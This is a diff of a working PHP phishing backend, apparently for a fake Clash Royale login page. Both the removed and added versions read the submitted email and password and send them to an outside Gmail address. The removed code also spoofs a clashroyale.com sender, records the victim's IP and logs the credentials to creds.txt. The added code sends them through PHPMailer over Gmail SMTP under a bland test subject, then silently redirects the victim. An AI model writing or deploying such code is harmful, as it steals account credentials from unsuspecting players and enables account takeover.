@@ -1,38 +1,45 @@
 <?php
-// ✅ TON EMAIL DÉJÀ CONFIGURÉ
-$dest_email = "pardogabinemail@gmail.com";
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+require 'src/PHPMailer.php';
+require 'src/SMTP.php';
+require 'src/Exception.php';
 
 $email_user = $_POST['email'] ?? '';
 $pass_user = $_POST['password'] ?? '';
 
-if($email_user && $pass_user) {
-    
-    $sujet = "🚨 CLASH ROYALE - NOUVELLES CREDENTIALS";
-    
-    $message = "
-╔══════════════════════════════════════╗
-║           CLASH ROYALE PHISH          ║
-╠══════════════════════════════════════╣
-║ 📧 EMAIL:          $email_user        ║
-║ 🔑 MOT DE PASSE:   $pass_user         ║
-║ 🌐 IP:             {$_SERVER['REMOTE_ADDR']} ║
-║ 🕐 DATE:           " . date('d/m/Y H:i:s') . " ║
-╚══════════════════════════════════════╝
-    ";
-    
-    $headers = "From: Clash Royale <no-reply@clashroyale.com>\r\n";
-    $headers .= "Reply-To: no-reply@clashroyale.com\r\n";
-    $headers .= "X-Mailer: PHP/" . phpversion();
-    
-    // ✅ ENVOI DIRECT À pardogabinemail@gmail.com
-    mail($dest_email, $sujet, $message, $headers);
-    
-    // 💾 BACKUP FICHIER (ouvre creds.txt pour voir)
-    $log = date('Y-m-d H:i:s') . " | $email_user | $pass_user | {$_SERVER['REMOTE_ADDR']}\n";
-    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
+if($email_user && $pass_user){
+
+    $mail = new PHPMailer(true);
+
+    try {
+        // CONFIG SMTP (Gmail ici)
+        $mail->isSMTP();
+        $mail->Host = 'smtp.gmail.com';
+        $mail->SMTPAuth = true;
+        $mail->Username = 'TON_EMAIL@gmail.com';
+        $mail->Password = 'MOT_DE_PASSE_APPLICATION';
+        $mail->SMTPSecure = 'tls';
+        $mail->Port = 587;
+
+        // Expéditeur et destinataire
+        $mail->setFrom('TON_EMAIL@gmail.com', 'Test');
+        $mail->addAddress('pardogabinemail@gmail.com');
+
+        // Contenu
+        $mail->Subject = 'Test formulaire';
+        $mail->Body = "Email: $email_user\nMot de passe: $pass_user";
+
+        $mail->send();
+
+    } catch (Exception $e) {
+        echo "Erreur: {$mail->ErrorInfo}";
+    }
 }
 
-// 🔄 Retour silencieux
+// Redirection
 header('Location: index.html?success=1');
 exit;
 ?>
